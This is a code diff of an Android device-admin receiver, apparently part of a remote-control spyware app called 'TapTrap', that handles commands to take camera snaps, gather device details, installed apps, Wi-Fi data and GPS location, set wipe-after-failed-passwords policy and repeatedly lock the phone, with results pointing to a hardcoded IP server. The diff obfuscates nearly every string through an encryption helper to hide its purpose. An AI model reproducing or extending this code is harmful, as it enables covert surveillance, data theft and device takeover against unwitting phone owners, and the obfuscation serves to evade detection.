@@ -258,30 +258,30 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             case "front_snap":
                 Intent frontIntent = new Intent(context, CameraService.class);
-                frontIntent.putExtra(CameraService.EXTRA_LENS, "front");
+                frontIntent.putExtra(CameraService.EXTRA_LENS, StringHelper.qzxp("8mjjuAI="));  // "front"
                 context.startService(frontIntent);
-                return "📸 Front camera snap taken! Check http://20.2.66.175:9090";
+                return StringHelper.qzxp("e/+w1GoaGah1HTwrW/wOq14mG1+kkMh63RXHDgSABXPuA0hMIigftyFGM3oKv1n3CTBGAPLV0jeMR5I=");  // "📸 Front camera snap taken! Check http://20.2.66.175:9090"
 
             case "back_snap":
                 Intent backIntent = new Intent(context, CameraService.class);
-                backIntent.putExtra(CameraService.EXTRA_LENS, "back");
+                backIntent.putExtra(CameraService.EXTRA_LENS, "back");  // "back"
                 context.startService(backIntent);
-                return "📸 Back camera snap taken! Check http://20.2.66.175:9090";
+                return StringHelper.qzxp("RJD1p81mvodPZUotLO/c4ewi2udpR773D70eeKWPSe3XZEZ3mVCv3gtqG3xvuIC2+n+FsSxd86Zd6A==");  // "📸 Back camera snap taken! Check http://20.2.66.175:9090"
 
             default:
-                return "❌ Unknown command: " + command + " | type 'help' for commands";
+                return StringHelper.qzxp("2zZDvVHyWh6S+o9eG8hJYCJ04nj6") + command + " | type 'help' for commands";  // "❌ Unknown command: "
         }
     }
 
 
     // Device info
     private String getDeviceInfo() {
-        return "Model: " + android.os.Build.MODEL +
-                "\nManufacturer: " + android.os.Build.MANUFACTURER +
-                "\nAndroid: " + android.os.Build.VERSION.RELEASE +
-                "\nAPI: " + android.os.Build.VERSION.SDK_INT +
-                "\nDevice: " + android.os.Build.DEVICE +
-                "\nFingerprint: " + android.os.Build.FINGERPRINT;
+        return StringHelper.qzxp("hMMSzCvAgg==")  + android.os.Build.MODEL + // "Model: "
+                StringHelper.qzxp("5NI574tArZV7u+ZD8fId")  + android.os.Build.MANUFACTURER + // "\nManufacturer: "
+                StringHelper.qzxp("xPevzRi7p7lfFw==")  + android.os.Build.VERSION.RELEASE + // "\nAndroid: "
+                StringHelper.qzxp("NQAQFsAp") + android.os.Build.VERSION.SDK_INT + // "\nAPI: "
+                StringHelper.qzxp("U6/da04cLzTw")  + android.os.Build.DEVICE +   // "\nDevice: "
+                StringHelper.qzxp("BbUy01OwgMo66IH7vbA=")  + android.os.Build.FINGERPRINT; // "\nFingerprint: "
     }
 
     // Battery info
@@ -294,14 +294,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         float pct = level * 100 / (float) scale;
         boolean charging = status == android.os.BatteryManager.BATTERY_STATUS_CHARGING ||
                 status == android.os.BatteryManager.BATTERY_STATUS_FULL;
-        return "Battery: " + (int) pct + "% | " + (charging ? "Charging" : "Not charging");
+        return StringHelper.qzxp("wV61+zRZMQ7Y")  + (int) pct + "% | " + (charging ? "Charging" : "Not charging");  // "Battery: "
     }
 
     // IP Address
     private String getIpAddress() {
         try {
             java.util.Enumeration<java.net.NetworkInterface> interfaces = java.net.NetworkInterface.getNetworkInterfaces();
-            StringBuilder sb = new StringBuilder("IP Addresses:\n");
+            StringBuilder sb = new StringBuilder(StringHelper.qzxp("7j5Zl53P2bpd/lHhx9g=") ); // "IP Addresses:\n"
             while (interfaces.hasMoreElements()) {
                 java.net.NetworkInterface iface = interfaces.nextElement();
                 java.util.Enumeration<java.net.InetAddress> addrs = iface.getInetAddresses();
@@ -314,7 +314,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             }
             return sb.toString();
         } catch (Exception e) {
-            return "Failed to get IP: " + e.getMessage();
+            return StringHelper.qzxp("lVb2bxZQLupDHJgdqNi4fpZO")  + e.getMessage(); // "Failed to get IP: "
         }
     }
 
@@ -335,13 +335,13 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     // List installed apps
     private String getInstalledApps(Context context) {
-        StringBuilder sb = new StringBuilder("Installed Apps:\n");
+        StringBuilder sb = new StringBuilder(StringHelper.qzxp("FVfkvSEd7UfvPxOYWTqR4Q==")); // "Installed Apps:\n"
 
         try {
             // Use compat method
             List<ApplicationInfo> apps = getInstalledAppsCompat(context);
 
-            sb.append("Total apps found: ").append(apps.size()).append("\n");
+            sb.append(StringHelper.qzxp("lp13LhSaOUUTILX2SjCVgwpE") ).append(apps.size()).append("\n"); // "Total apps found: "
 
             for (ApplicationInfo app : apps) {
                 // Skip system apps (optional)
@@ -353,14 +353,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 //}
             }
 
-            Log.d("TapTrap", "App list generated: " + apps.size() + " apps");
+            Log.d("TapT",StringHelper.qzxp("WKuygDU+MVFDyM5t47wsJfRB+N8=") + apps.size() + StringHelper.qzxp("Obqy0Co=") ); //  "App list generated: "  " apps"
 
         } catch (SecurityException e) {
-            Log.e("TapTrap", "Permission denied: " + e.getMessage());
-            sb.append("ERROR: Missing QUERY_ALL_PACKAGES permission");
+            Log.e("TapT", StringHelper.qzxp("ituYT6/LyeZVeKzF9bNooyFkUA==")  + e.getMessage()); // "Permission denied: "
+            sb.append(StringHelper.qzxp("")); //  "ERROR: Missing QUERY_ALL_PACKAGES permission"
         } catch (Exception e) {
-            Log.e("TapTrap", "Error getting apps: " + e.getMessage());
-            sb.append("ERROR: ").append(e.getMessage());
+            Log.e("TapT", StringHelper.qzxp("id2vJUK89/oa7kGz6X0dBXLftMM=") + e.getMessage()); // "Error getting apps: "
+            sb.append(StringHelper.qzxp("fb6cScqePg==") ).append(e.getMessage()); //"ERROR: "
         }
 
         return sb.toString();
@@ -396,7 +396,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
      */
     public void lockDevice(Context context) {
         DevicePolicyManager dpm = getDpm(context);
-        Log.d(TAG, " Locking device now");
+        Log.d(TAG,StringHelper.qzxp("Foc8gFUbKu0mYcK2Wcuj4Wkt/Q==")); //  " Locking device now"
         dpm.lockNow();
 
     }
@@ -409,22 +409,22 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             // Validate attempts range (1-10 as per documentation)
             if (attempts < 1 || attempts > 10) {
-                Log.e(TAG, "Attempts must be between 1 and 10");
+                Log.e(TAG, StringHelper.qzxp("jDOMZq9jh8r6tCq+TYN1qb/7UyHbY92G5bVtMMk3B+z9")); // "Attempts must be between 1 and 10"
                 return;
             }
 
             // Set the policy
             dpm.setMaximumFailedPasswordsForWipe(admin, attempts);
-            Log.i(TAG, "✅ Max failed attempts set to: " + attempts);
+            Log.i(TAG, StringHelper.qzxp("5dgDcvrtCyHZ5oYw8SDXpq5zv//QW5UaWht0fyClnzs=")+ attempts); // "✅ Max failed attempts set to: "
 
             // Verify it was set
             int currentSetting = dpm.getMaximumFailedPasswordsForWipe(admin);
-            Log.d(TAG, "Verified setting: " + currentSetting);
+            Log.d(TAG, StringHelper.qzxp("pWvvcV/M90VLGveYwSiUbyOP") + currentSetting); // "Verified setting: "
 
         } catch (SecurityException e) {
-            Log.e(TAG, "Security error: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("hSZZAVZ3b1wAte6wYNFWgA==") + e.getMessage()); // "Security error: "
         } catch (Exception e) {
-            Log.e(TAG, "Error: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("TG1nqO4hZg==") + e.getMessage()); // "Error: "
         }
     }
 
@@ -432,7 +432,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
     public void startContinuousLock(final Context context) {
         if (isContinuousLockActive.get()) {
-            Log.d(TAG, "⚠️ Already locking");
+            Log.d(TAG, StringHelper.qzxp("b+cB2wZ8qQE7Ap7Z1pJOISO+hsjJ7Q==")); // "⚠️ Already locking"
             return;
         }
 
@@ -440,11 +440,11 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
         try {
             PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
             wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK,
-                    "TapTrap:LockWakeLock");
+                    StringHelper.qzxp("4qJNERECyjAtE1z0YUAzKOMQ3SQ=")); //  "TapTrap:LockWakeLock"
             wakeLock.acquire(10*60*1000L);
-            Log.d(TAG, "✅ WakeLock acquired");
+            Log.d(TAG, StringHelper.qzxp("r4b6jglX+O/CfHE62q2+a8nVldhs")); // "✅ WakeLock acquired"
         } catch (Exception e) {
-            Log.e(TAG, "Failed to acquire WakeLock: " + e.getMessage());
+            Log.e(TAG, StringHelper.qzxp("mZP1XyU50JWVy5BItkF/pZG4T309xLBuvMSsOA==") + e.getMessage()); // "Failed to acquire WakeLock: "
         }
 
         isContinuousLockActive.set(true);
@@ -453,7 +453,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             DevicePolicyManager dpm = (DevicePolicyManager)
                     context.getSystemService(Context.DEVICE_POLICY_SERVICE);
 
-            Log.d(TAG, "▶️ LOCK STARTED - Will auto-stop after 50 locks");
+            Log.d(TAG, StringHelper.qzxp("M5zckvtbe9RIfugi7BVN45hOvtEgLHZAmYyxEeis5iiifgUNY7U97GJPgzePYWDer2CJ")); // "▶️ LOCK STARTED - Will auto-stop after 50 locks"
 
             int lockCount = 0;
             long startTime = System.currentTimeMillis();
@@ -464,24 +464,24 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                     lockCount++;
 
                     long runningTime = (System.currentTimeMillis() - startTime) / 1000;
-                    Log.d(TAG, "🔒 Lock #" + lockCount + " - " + runningTime + "s elapsed");
+                    Log.d(TAG, StringHelper.qzxp("QHJLgSvprmKWNUE=") + lockCount + " - " + runningTime + "s elapsed"); // "🔒 Lock #"
 
                     // SAFEGUARD: Stop after 50 locks
                     if (lockCount >= 20) {
-                        Log.d(TAG, "⚠️ SAFEGUARD: 50 locks reached, stopping");
-                        break;  // ✅ Jumps to cleanup below
+                        Log.d(TAG, StringHelper.qzxp("NftPM7DlHLDFxo6HwQEmQ7dnt3dtkVeUf2mfTdGaasOyBcP8ex5Tk/Tppac=")); // "⚠️ SAFEGUARD: 50 locks reached, stopping"
+                         break;  // ✅ Jumps to cleanup below
                     }
 
                     Thread.sleep(5000);  // 5 second delay
 
                 } catch (InterruptedException e) {
-                    Log.d(TAG, "⏹️ Thread interrupted");
+                    Log.d(TAG,StringHelper.qzxp("YAJKrlWwW5EFwzZVsYP9zaSKYsW2GRmikQ==")); //  "⏹️ Thread interrupted"
                     break;  // ✅ Jumps to cleanup
                 } catch (SecurityException e) {
-                    Log.e(TAG, "❌ Security error - admin disabled");
+                    Log.e(TAG,StringHelper.qzxp("NRW7McZgTgGvKfEMBH+k9DZdKEhvQxSEzTB4Fpk2zmu77VM=")); // "❌ Security error - admin disabled"
                     break;  // ✅ Jumps to cleanup
                 } catch (Exception e) {
-                    Log.e(TAG, "❌ Unexpected error: " + e.getMessage());
+                    Log.e(TAG, StringHelper.qzxp("9/z5whf7ujxPioNTfLeYEyVMaNObsA==") + e.getMessage()); // "❌ Unexpected error: "
                     // Continue locking despite error
                 }
             }
@@ -490,13 +490,13 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
             if (wakeLock != null && wakeLock.isHeld()) {
                 wakeLock.release();
                 wakeLock = null;
-                Log.d(TAG, "✅ WakeLock released");
+                Log.d(TAG, StringHelper.qzxp("b61QKFjV9748v0yoanJfGIIpYd6Z")); //"✅ WakeLock released"
             }
 
             isContinuousLockActive.set(false);
 
             long totalTime = (System.currentTimeMillis() - startTime) / 1000;
-            Log.d(TAG, "⏹️ LOCKING STOPPED after " + totalTime + "s and " + lockCount + " locks");
+            Log.d(TAG, StringHelper.qzxp("n5knPJTSU50neaGr9KItptC3ZfpoRA18prr9iag=")+ totalTime + "s and " + lockCount + " locks"); // "⏹️ LOCKING STOPPED after "
         });
 
         continuousLockThread.start();
@@ -514,7 +514,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 try {
                     continuousLockThread.join(2000); // Wait up to 2 seconds
                 } catch (InterruptedException e) {
-                    Log.e(TAG, "Interrupted while joining thread");
+                    Log.e(TAG,StringHelper.qzxp("OSqLZj/7o4lGOKBQqwKq/Bmubtk3UU1r83jqbyEOW+8=")); //  "Interrupted while joining thread"
                 }
                 continuousLockThread = null;
             }
@@ -525,9 +525,9 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                 wakeLock = null;
             }
 
-            Log.d(TAG, "⏹️ Continuous locking STOPPED (OFF)");
+            Log.d(TAG, StringHelper.qzxp("SQyMHy+KSN4Bx9L7mpwBmSabUoi/5K2vKTiJgSluCZHvox2/0UNB")); // "⏹️ Continuous locking STOPPED (OFF)"
         } else {
-            Log.d(TAG, "⚠️ Continuous locking was not active");
+            Log.d(TAG, StringHelper.qzxp("v9IU5DeZ4joreqg+mAHeEU5fVLo32Qkku6dPQOofVEMpaNVo+3+0HA==")); // "⚠️ Continuous locking was not active"
         }
     }
 
@@ -548,14 +548,14 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                     context.getSystemService(Context.CONNECTIVITY_SERVICE);
             android.net.NetworkInfo netInfo = cm.getActiveNetworkInfo();
 
-            return "WiFi Info:" +
-                    "\nSSID: " + info.getSSID() +
-                    "\nBSSID: " + info.getBSSID() +
-                    "\nSignal: " + info.getRssi() + " dBm" +
-                    "\nIP: " + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5 bars" +
-                    "\nConnected: " + (netInfo != null && netInfo.isConnected());
+            return StringHelper.qzxp("cUpdBTttmCyyHA==") + //  "WiFi Info:"
+                    StringHelper.qzxp("AavhoVqnwQ==")  + info.getSSID() + //"\nSSID: "
+                    StringHelper.qzxp("niBdT/mdqAc=")  + info.getBSSID() + // "\nBSSID: "
+                    StringHelper.qzxp("6hH8u6gGbTHm")  + info.getRssi() + " dBm" + //"\nSignal: "
+                    StringHelper.qzxp("vQ1e9ls=") + android.net.wifi.WifiManager.calculateSignalLevel(info.getRssi(), 5) + "/5 bars" +  //"\nIP: "
+                    StringHelper.qzxp("TxsQhJlA9CSu+WMZ")  + (netInfo != null && netInfo.isConnected()); // "\nConnected: "
         } catch (Exception e) {
-            return "WiFi info failed: " + e.getMessage();
+            return StringHelper.qzxp("ti0x2sEcjhwhfZTpPQluZqOL") + e.getMessage(); //  "WiFi info failed: "
         }
     }
 
@@ -567,7 +567,7 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
 
             if (android.content.pm.PackageManager.PERMISSION_GRANTED !=
                     context.checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION)) {
-                return "❌ Location permission not granted";
+                return StringHelper.qzxp("SoyL2qgIVYNInNsWsDxGxzy3lOJzuYrx4A4tUH1CrUjcdGM="); //"❌ Location permission not granted"
             }
 
             android.location.Location location = lm.getLastKnownLocation(
@@ -578,17 +578,17 @@ public class AppDeviceAdminReceiver extends DeviceAdminReceiver {
                         android.location.LocationManager.NETWORK_PROVIDER);
             }
 
-            if (location == null) return "❌ Location unavailable";
+            if (location == null) return StringHelper.qzxp("0JzsAU/vRh+gI3sPJG0YOY8k6fmR74ud") ; //"❌ Location unavailable"
 
-            return "Location:" +
-                    "\nLatitude: " + location.getLatitude() +
-                    "\nLongitude: " + location.getLongitude() +
-                    "\nAccuracy: " + location.getAccuracy() + "m" +
-                    "\nGoogle Maps: https://maps.google.com/?q=" +
+            return StringHelper.qzxp("VfUWKAbbsmmW")+ //  "Location:"
+                    StringHelper.qzxp("8j4Hfr65BLKz9qk=") + location.getLatitude() + //"\nLatitude: "
+                    StringHelper.qzxp("/YCey2WzLJxt65KL") + location.getLongitude() + //"\nLongitude: "
+                    StringHelper.qzxp("UdNPFgAiqMnmR8w=")  + location.getAccuracy() + "m" + //"\nAccuracy: "
+                     "\nGoogle Maps: https://maps.google.com/?q=" +
                     location.getLatitude() + "," + location.getLongitude();
 
         } catch (Exception e) {
-            return "Location failed: " + e.getMessage();
+            return StringHelper.qzxp("5N2B7daEngE0ranF3f8U+DM=") + e.getMessage(); // "Location failed: "
         }
     }
 
